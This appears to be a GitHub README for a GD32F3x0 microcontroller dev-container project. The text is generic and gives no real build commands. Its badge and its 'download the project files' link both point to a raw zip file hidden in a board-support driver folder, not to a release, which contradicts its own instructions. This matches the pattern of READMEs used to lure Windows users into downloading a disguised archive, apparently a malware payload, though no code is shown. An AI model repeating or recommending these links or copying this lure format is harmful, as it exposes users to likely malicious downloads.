# 🛠️ gd32f3x0-cmake-vscode - Build embedded software with ease today

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip)

This project provides a complete environment for developing software for GD32F3x0 microcontrollers. You can write code for your hardware without installing complex tools on your main computer. The system uses a container, which acts as a contained workspace. This approach keeps your computer clean and ensures the tools stay compatible.

## 📋 What you need to begin

You need a computer running Windows 10 or 11. You must install these two pieces of software before you start:

1. Visual Studio Code: This is the text editor where you will write your code.
2. Docker Desktop: This software manages the container that holds the development tools.

Once you install both, restart your computer to ensure the system recognizes the changes. You may also need to enable virtualization in your computer BIOS if Docker shows an error during startup.

## 💾 Setting up the tools

Visit this page to download the project files: [https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip)

Choose the source code zip file from the latest release. Save this file to a folder on your computer. Extract the contents of the zip file to a location you can easily find, such as your Documents folder.

## 🚀 Opening your project

1. Open Visual Studio Code.
2. Select "File" then "Open Folder" from the menu.
3. Select the folder you extracted in the previous step.
4. Visual Studio Code will see a configuration file inside that folder. It will ask if you want to reopen the project in a container. Click "Reopen in Container".

The first time you do this, the computer will download the necessary tools. This takes a few minutes depending on your internet speed. Watch the bottom right corner of the editor to see the progress. Once the process finishes, the environment is ready for use.

## ⚙️ Understanding the environment

The container includes everything required to turn your code into instructions that the microcontroller understands. This setup includes the compiler, the build system known as CMake, and tools for flashing the code to your hardware.

The FatFs library is included by default. This library helps you manage files if you plan to connect external storage, such as an SD card, to your microcontroller. You do not need to install extra packages or libraries to use these features.

## 🔨 Building your code

The build process turns your source code into a binary file. To start this process:

1. Open the terminal inside Visual Studio Code by pressing the backtick key or selecting "Terminal" and "New Terminal" from the menu.
2. Type the command to generate the build files. The system uses CMake to prepare the project.
3. Once CMake finishes, initiate the build command. The compiler reads your source files and creates a file with a .bin extension.

Errors will appear in the output window if the compiler finds issues in your code. Read these messages carefully to identify which file or line needs attention.

## 🔌 Connecting hardware

You will need a hardware debugger to transfer your code to the GD32 chip. OpenOCD is pre-installed in the container to handle this communication. Connect your debugger to your USB port. You may need to identify the correct port inside the configuration files if the software cannot detect the board immediately.

## 💡 Support and Troubleshooting

If the container fails to start, check that Docker Desktop is running. Ensure you have enough disk space for the container image. 

Clear the existing build folder if you encounter strange errors after changing settings. You can do this by deleting the folder named "build" within your project directory and running the build steps again.

## 📁 Project structure

- src folder: Store your main code files here.
- include folder: Place your header files in this location.
- build folder: The system places the final output files here.
- .devcontainer: This folder contains the settings for the container environment.

## 🏁 Final steps

You are now ready to write firmware for your GD32F3x0 chip. This project removes the frustration of setting up toolchains and managing paths. You can focus on your code rather than the underlying software systems. Remember to save your work frequently and use version control software if you plan to track your changes over time. 

The environment stays static until you update the files in the .devcontainer folder. You can add more tools or libraries to this folder in the future if your project requirements change. For now, the included tools cover the baseline needs for common microcontroller development tasks.